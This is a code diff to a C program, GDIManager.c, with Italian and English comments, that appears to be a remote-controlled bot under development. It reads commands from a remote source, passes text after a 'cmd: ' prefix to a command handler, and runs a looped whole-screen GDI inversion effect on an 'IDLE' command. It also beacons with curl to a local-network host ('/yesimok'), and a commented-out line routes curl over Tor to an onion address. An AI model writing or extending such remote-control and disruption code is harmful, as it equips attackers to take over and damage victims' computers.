@@ -32,7 +32,9 @@ So I will create 2 files. 1 with english comments and the other with original co
 {:-)} ---> End Introduction <--- {(-:}
 */
 
-// compile 4 windows: cl C:\Users\user\Desktop\GDIManager.c /O2 /link gdi32.lib user32.lib
+// compile 4 windows: 
+//cd C:\Program Files\Microsoft Visual Studio\18\Community\VC\Tools\MSVC\14.51.36231\bin\Hostx64\x64
+//cl C:\Users\user\Desktop\GDIManager.c /O2 /link gdi32.lib user32.lib
 // devi compilare dalla shell di sviluppo x64 di vscommunity
 
 // Inizio flag per Windows
@@ -332,17 +334,19 @@ void idlefx() {
     HDC hdc = GetDC(NULL);
 
     static int counter = 0;
-    counter = counter + 1;
+    counter = counter + 5;
 
-    if (counter >= h) {counter = 0;} // resetta il counter se supera lo schermo in larghezza
+    if (counter >= h) {counter = 0;} // resetta il counter se supera lo schermo in altezza
 
-    BitBlt(hdc, counter, 5, w, 5, hdc, counter, 0, SRCCOPY);
+    BitBlt(hdc, 5, counter, w, 5, hdc, 0, counter + 5, SRCINVERT);
     ReleaseDC(NULL, hdc);
     Sleep(1);
 }
 
 void checkconn() {
     system("curl -s http://192.168.122.1:80/yesimok");
+    printf(" --- yes im ok ---\n");
+    Sleep(20);
     // system("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r");
 }
 
@@ -560,8 +564,8 @@ int main() {
         }
 
         else if (strcmp(reqtextbuffer, "IDLE") == 0) {
-            idlefx();
-        }
+            int i;
+            for (i=0;i<200;i++) {idlefx();}}
 
         else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
             char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
@@ -584,7 +588,7 @@ int main() {
             countdown(secs);
         }
 
-        else if (strstr(reqtextbuffer, "Are u OK?") == 0) {checkconn();}
+        else if (strcmp(reqtextbuffer, "oky?") == 0) {checkconn();}
         else {Sleep(20000);}
     }
     return 0;
